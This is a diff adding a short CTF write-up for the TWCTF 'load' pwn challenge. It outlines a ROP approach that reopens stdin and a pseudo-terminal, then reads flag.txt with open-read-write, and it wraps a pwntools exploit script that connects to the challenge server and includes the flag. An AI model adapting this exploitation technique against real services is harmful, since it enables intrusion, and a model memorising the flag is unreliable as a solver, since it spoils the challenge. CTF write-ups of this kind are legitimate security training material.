@@ -1,11 +1,14 @@
+# load
+* Open `/dev/stdin` to input ROP payload.
+* Open the right `/dev/pts/<right number>` tiwce -> fd : 0 , 1.
+* ORW `flag.txt`.
+```python
 #!/usr/bin/env python
 from pwn import *
 
 # TWCTF{pr0cf5_15_h1ghly_fl3x1bl3}
 
 context.arch = 'amd64'
-
-e = ELF( './load' )
 
 host , port = 'pwn1.chal.ctf.westerns.tokyo' , 34835
 y = remote( host , port )
@@ -68,3 +71,4 @@ p = flat(
 y.send( p )
 
 y.interactive()
+```
